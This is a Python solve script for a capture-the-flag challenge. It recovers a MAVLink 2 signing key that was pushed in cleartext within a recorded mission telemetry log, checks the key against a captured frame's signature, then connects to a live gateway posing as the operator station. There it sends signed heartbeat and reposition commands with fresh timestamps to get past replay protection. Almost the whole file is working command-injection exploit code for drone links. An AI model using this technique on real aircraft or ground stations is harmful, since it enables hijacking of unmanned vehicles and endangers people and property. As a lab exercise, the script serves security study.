#!/usr/bin/env python3
"""severed-link -- take the operator's place on a signed MAVLink 2 uplink.

The operator rotated the per-frame signing key mid-mission and pushed the new
key IN BAND, in a SETUP_SIGNING message, over the very link that was being
recorded. So the key is sitting in cleartext in mission.tlog. With it, an
outsider can sign fresh frames and command the aircraft.

Pipeline:
  1. parse mission.tlog (beside this script) -> SETUP_SIGNING.secret_key
  2. verify the key by recomputing a captured frame's signature
  3. connect to the live gateway, send a signed HEARTBEAT then a signed
     COMMAND_INT DO_REPOSITION from sysid 255 with a CURRENT timestamp
     (replays with the capture's old timestamps are refused), and read the
     audit receipt -> flag.

Requires: pymavlink   (pip install pymavlink)
Usage:    python solve.py <host> <port>        e.g. w03.ctf.chronos-security.ro 34100
"""
import hashlib
import os
import re
import socket
import sys
import time

from pymavlink import mavutil
import pymavlink.dialects.v20.common as common

HERE = os.path.dirname(os.path.abspath(__file__))
TLOG = os.path.join(HERE, "mission.tlog")
OPERATOR_SYS, OPERATOR_COMP = 255, 190      # operator station identity from ops_notes
DRONE_SYS, DRONE_COMP = 1, 1
MAV_EPOCH = 1420070400.0                     # 2015-01-01; MAVLink timestamps are 10us units since then


def recover_key(path):
    """Return the 32-byte secret_key the operator pushed via SETUP_SIGNING."""
    m = mavutil.mavlink_connection(path)
    key = None
    while True:
        msg = m.recv_match(blocking=False)
        if msg is None:
            break
        if msg.get_type() == "SETUP_SIGNING":
            key = bytes(msg.secret_key)
    if key is None:
        sys.exit("no SETUP_SIGNING in capture")
    return key


def verify_against_capture(path, key):
    """Recompute the signature of the last post-rotation COMMAND_LONG and check it.

    MAVLink2 signature = SHA256(key || frame_through_CRC || link_id || timestamp)[:6].
    """
    data = open(path, "rb").read()
    frames, i = [], 0
    while True:
        j = data.find(b"\xfd", i)                     # MAVLink2 magic
        if j < 0 or j + 10 > len(data):
            break
        plen, incompat = data[j + 1], data[j + 2]
        total = 10 + plen + 2 + (13 if incompat & 1 else 0)
        f = data[j:j + total]
        if len(f) == total:
            frames.append(f)
        i = j + 1
    best = None
    for f in frames:
        incompat = f[2]
        msgid = f[7] | (f[8] << 8) | (f[9] << 16)
        if incompat & 1 and msgid == 76:              # COMMAND_LONG
            best = f
    if not best:
        return None
    plen = best[1]
    body = best[:10 + plen + 2]                        # magic..payload..CRC
    link_id, ts, given = best[-13:-12], best[-12:-6], best[-6:]
    calc = hashlib.sha256(key + body + link_id + ts).digest()[:6]
    return calc == given, calc.hex(), given.hex()


def current_ts():
    return int((time.time() - MAV_EPOCH) * 1e5)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "w03.ctf.chronos-security.ro"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 34100

    key = recover_key(TLOG)
    print("[*] recovered signing key:", key.hex())
    chk = verify_against_capture(TLOG, key)
    if chk:
        ok, calc, given = chk
        print("[*] signature check vs capture: %s (calc %s == given %s)" % (ok, calc, given))

    s = socket.create_connection((host, port), timeout=6)
    s.settimeout(4)

    mav = mavutil.mavlink.MAVLink(None, srcSystem=OPERATOR_SYS, srcComponent=OPERATOR_COMP)
    mav.signing.secret_key = key
    mav.signing.sign_outgoing = True
    mav.signing.link_id = 0
    last = [0]

    def send(msg):
        t = current_ts()
        if t <= last[0]:
            t = last[0] + 1                            # strictly monotonic, still "current"
        last[0] = t
        mav.signing.timestamp = t
        s.send(msg.pack(mav))

    hb = common.MAVLink_heartbeat_message(
        common.MAV_TYPE_GCS, common.MAV_AUTOPILOT_INVALID, 0, 0, 0, 3)
    # COMMAND_INT DO_REPOSITION (192), echoing the operator's captured parameters
    ci = common.MAVLink_command_int_message(
        DRONE_SYS, DRONE_COMP, 5, 192, 0, 0, -1.0, 1.0, 0.0, 0.0, 457920000, 241510000, 85.0)

    send(hb)
    time.sleep(0.3)
    send(ci)
    print("[*] sent signed HEARTBEAT + COMMAND_INT DO_REPOSITION as operator (sys 255)")

    parser = mavutil.mavlink.MAVLink(None)
    parser.robust_parsing = True
    buf = b""
    t0 = time.time()
    while time.time() - t0 < 18:
        try:
            d = s.recv(4096)
        except socket.timeout:
            send(hb); time.sleep(0.3); send(ci); continue
        if not d:
            break
        buf += d
        for m in (parser.parse_buffer(d) or []):
            if m.get_type() == "STATUSTEXT":
                print("    STATUSTEXT:", m.text)
        if b"CSCTF{" in buf:
            flag = re.search(rb"CSCTF\{[^}]*\}", buf).group().decode()
            print("\n[+] FLAG:", flag)
            return
    print("[-] no flag seen")


if __name__ == "__main__":
    main()
